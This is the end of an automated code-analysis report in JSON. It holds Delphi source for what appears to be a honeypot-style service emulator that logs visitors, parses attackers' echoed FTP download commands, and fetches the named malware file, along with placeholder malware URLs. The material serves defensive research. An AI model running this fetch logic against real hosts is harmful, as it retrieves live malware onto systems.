            "        FTPUser := Copy(FTPUser, Pos('echo', LowerCase(FTPUser))+4, Length(FTPUser));",
            "        FTPUser := Copy(FTPUser, 1, Pos('>>', FTPUser)-1);",
            "        // the pass",
            "        FTPPass := Copy(Data, Pos('echo', LowerCase(Data))+4, Length(Data));",
            "        FTPPass := Copy(FTPPass, Pos('echo', LowerCase(FTPPass))+4, Length(FTPPass));",
            "        FTPPass := Copy(FTPPass, Pos('echo', LowerCase(FTPPass))+4, Length(FTPPass));",
            "        FTPPass := Copy(FTPPass, 1, Pos('>>', FTPPass)-1);",
            "        FTPName := Trim(FTPName);",
            "        FTPPort := Trim(FTPPort);",
            "        FTPFile := Trim(FTPFile);",
            "        FTPUser := Trim(FTPUser);",
            "        FTPPass := Trim(FTPPass);",
            "        Form1.AddLog('@'+dName+'.'+dVer+': Downloading file from FTP ('+FTPuser+':'+FTPPass+' @ '+FTPName+':'+FTPPort+' '+FTPFile+')');",
            "        Form1.Memo2.Lines.Add('['+TimeToStr(Now)+' FTP '+rIP(eSock)+']'+",
            "        'Connecting to '+FTPName+':'+FTPPort+'/'+FTPFile+' User:'+FTPUser+' Pass:'+FTPPass);",
            "        DownloadFileFromFTP(FTPUser, FTPPass, FTPName+'/'+FTPFile, MalwareName, StrToInt(FTPPort));",
            "      End;",
            "    Until dErr <= 0;",
            "    Form1.AddLog('@'+dName+'.'+dVer+': User disconnected ('+rIP(eSock)+')');",
            "    Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': User disconnected ('+rIP(eSock)+')');",
            "    Form1.DeleteVisitor(rIP(eSock), dName+'.'+dVer);",
            "    Sleep(1000);",
            "    CloseSocket(eSock);",
            "    rData := 0;",
            "    sData := 0;",
            "  End;",
            "CloseRemote:",
            "  If (eSock <> INVALID_SOCKET) Then",
            "  Begin",
            "    Form1.AddLog('@'+dName+'.'+dVer+': User disconnected ('+rIP(eSock)+')');",
            "    Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': User disconnected ('+rIP(eSock)+')');",
            "    Form1.DeleteVisitor(rIP(eSock), dName+'.'+dVer);",
            "    rData := 0;",
            "    sData := 0;",
            "  End;",
            "  CloseSocket(Sock);",
            "  WSACleanUP;",
            "  INC(EXPLOIT_SUCCESS);",
            "Goto GoBack;",
            "End;",
            "Function TScript.GetParam(dName, dText: String): String;",
            "  P: Integer;",
            "Begin",
            "  P := Pos( LowerCase(dName), LowerCase(dText) );",
            "  If (P > 0) Then",
            "  Begin",
            "    Result := Copy(dText, P+1, length(dText));",
            "    Result := Copy(Result, 1, Pos(#13, Result)-1);",
            "    Result := Trim(Copy(Result, Pos(':', Result)+1, Length(Result)));",
            "    If LowerCase(Result) = 'yes' Then Result := '1';",
            "    If LowerCase(Result) = 'no' Then Result := '0';",
            "    Result := Trim(Result);",
            "  End;",
            "End;",
            "Function TScript.GetResponse(dText: String): TResp;",
            "  I     :Integer;",
            "  Tmp   :String;",
            "Begin",
            "  Result.dGet := '';",
            "  Result.dResp := '';",
            "  If (dText[1] <> '\"') Then Exit;",
            "  Delete(dText,1,1);",
            "  Result.dGet := Copy(dText, 1, Pos('\"', dText)-1);",
            "  Delete(dText, 1, Pos('\"', dText));",
            "  Delete(dText, 1, pos('\"', dText));",
            "  Result.dResp := Copy(dText, 1, Pos('\"', dText)-1);",
            "  Tmp := Copy(dText, Pos('\"', dText)+1, Length(dText));",
            "  Tmp := Trim(Tmp);",
            "  Result.dFirst := False;",
            "  If (Tmp = 'nf') Then",
            "    Result.dFirst := False;",
            "  If (Tmp = 'f') Then",
            "    Result.dFirst := True;",
            "End;",
            "Procedure TScript.Start;",
            "  Data  :String;",
            "  Resp  :TResp;",
            "  Temp  :String;",
            "  I     :Integer;",
            "  C     :Integer;",
            "Begin",
            "  If Not FileExists(dScript) Then Exit;",
            "  ReadFileStr(dScript, Data);",
            "  FillChar(Response, SizeOf(Response), 0);",
            "  dBBTrans := False;",
            "  If GetParam('bounceback-transfer', Data) <> '' Then",
            "    dBBTrans      := Boolean(StrToInt(GetParam('bounceback-transfer', Data)));",
            "  dRespond := False;",
            "  If GetParam('response', Data) <> '' Then",
            "    dRespond      := Boolean(StrToInt(GetParam('response', Data)));",
            "  If GetParam('port', Data) <> '' Then",
            "    dPort         := StrToInt(GetParam('port', Data));",
            "  If (GetParam('transferport', Data) <> '') Then",
            "    dTransfer     := StrToInt(GetParam('transferport', Data));",
            "  dName         := GetParam('name', Data);",
            "  dVer          := GetParam('ver', Data);",
            "  If (dRespond) Then",
            "  Begin",
            "    dRespCount := StrToInt(GetParam('resp-count', Data));",
            "    C := 0;",
            "    For I := 1 To dRespCount Do",
            "    Begin",
            "      Temp := Copy(Data, Pos('ifd'+IntToStr(I), LowerCase(Data)), Length(Data));",
            "      Temp := Copy(Temp, Pos('\"', Temp), Length(Temp));",
            "      If (Pos(#13, Temp) > 0) Then",
            "        Temp := Copy(Temp, 1, Pos(#13, Temp)-1);",
            "      If (Temp <> '') Then",
            "      Begin",
            "        Resp := GetResponse(Temp);",
            "        If (Resp.dGet <> '') Then",
            "        Begin",
            "          Response[C] := Resp;",
            "          Inc(C);",
            "        End;",
            "      End;",
            "    End;",
            "  End;",
            "  If (dPort > 0) Then",
            "  Begin",
            "    INC(SCRIPT_LOADED);",
            "    StartServer(dPort);",
            "  End Else",
            "    INC(SCRIPT_FAILED);",
            "End;",
            "Procedure RunScript(P: Pointer); STDCALL;",
            "  Script:TScript;",
            "  Name  :String;",
            "Begin",
            "  Name := PInfo(P)^.dScript;",
            "  Script := TScript.Create;",
            "  Script.dScript := Name;",
            "  GoOn := True;",
            "  Script.Start;",
            "End;",
            "Procedure LoadScript(dName: String);",
            "  Thread:DWord;",
            "Begin",
            "  GoOn := False;",
            "  Info.dScript := dName;",
            "  CreateThread(NIL, 0, @RunScript, @Info, 0, Thread);",
            "  Repeat",
            "    Sleep(1);",
            "  Until GoOn;",
            "End;",
            "Procedure TScript.ReadFileStr(Name: String; Var Output: String);",
            "  cFile :File Of Char;",
            "  Buf   :Array [1..1024] Of Char;",
            "  Len   :LongInt;",
            "  Size  :LongInt;",
            "Begin",
            "  Try",
            "    Output := '';",
            "    AssignFile(cFile, Name);",
            "    Reset(cFile);",
            "    Size := FileSize(cFile);",
            "    While Not (Eof(cFile)) Do",
            "    Begin",
            "      BlockRead(cFile, Buf, 1024, Len);",
            "      Output := Output + String(Buf);",
            "    End;",
            "    CloseFile(cFile);",
            "    If Length(Output) > Size Then",
            "      Output := Copy(Output, 1, Size);",
            "  Except",
            "    ;",
            "  End;",
            "End;",
            "end."
        ],
        "file": {},
        "fuzzing": {},
        "ip": [
            "127.0.0.1"
        ],
        "url": [
            "http://domain.com/file.exe",
            "ftp://user:pass@domain:port/file.exe"
        ]
    },
    "time": "0:00:00.459538",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
